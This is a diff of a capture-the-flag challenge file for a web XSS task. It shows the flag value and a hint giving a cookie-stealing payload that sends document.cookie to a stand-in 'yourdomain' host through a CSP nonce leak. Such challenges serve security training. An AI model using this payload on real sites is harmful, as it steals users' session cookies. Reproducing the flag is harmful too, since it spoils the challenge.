@@ -12,7 +12,9 @@ flags:
   - flag: flag{xss_csp}
 hints:
   - content: "payload must be inline"
-  - content: "use `location='//yourdomain?'+document.cookie` + CSP nonce leak."
+  - cost: 0
+  - content: "use `location='//yourdomain?'+document.cookie` + CSP leak."
+  - cost: 0
 tags:
   - web
   - xss
